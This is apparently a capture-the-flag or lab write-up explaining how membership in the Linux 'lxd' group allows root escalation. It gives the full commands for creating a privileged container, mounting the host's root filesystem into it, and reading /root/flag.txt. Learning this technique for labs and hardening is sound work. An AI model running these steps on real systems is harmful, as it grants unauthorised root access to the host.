## What is LXD / LXC?

- **LXC (Linux Containers)** and **LXD (Linux Daemon)** are tools that let you create **lightweight virtual environments** called **containers**.
- Containers are **isolated** from the rest of the system, but they **share the same Linux kernel**.
- Think of it like running a mini Linux system inside a real one – like opening a new computer inside your current computer.

---

## 🧠 Why This Matters for Privilege Escalation?

If your user is part of the **`lxd` group**, it means you can manage and create these containers.  
But here's the trick:

> You can make a special container that has access to the **host system’s files as root**, allowing you to **escape the container and become root** on the host!

1. type `id` command and Make sure you're in the `lxd` group first:
2. Import the Alpine image you can download it from internet for now we have this in target system `alpine-v3.18-x86_64-20230607_1234.tar.gz`
   
```bash
lxc image import alpine-v3.18-x86_64-20230607_1234.tar.gz --alias alpescape
```
   
3. Confirm it was imported
```bash
lxc image list
```
   
   You should see a line for `alpescape`.
   
4. Create a **privileged container** from the image
```bash
lxc init alpescape privesc -c security.privileged=true
```
   This creates a new container called `privesc` with **privileged access** (important!).
   
5. Mount the host root `/` inside the container
```bash
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```
   This lets the container access the host's full file system at `/mnt/root`.
   
6. Start the container
   ```bash
lxc start privesc
```
   
7. Get a shell inside the container
```bash
lxc exec privesc /bin/sh
```
_(Alpine uses `/bin/sh` instead of `/bin/bash`)_

8. Access the host system's root directory
```bash
ls /mnt/root
cd /mnt/root/root
cat flag.txt
```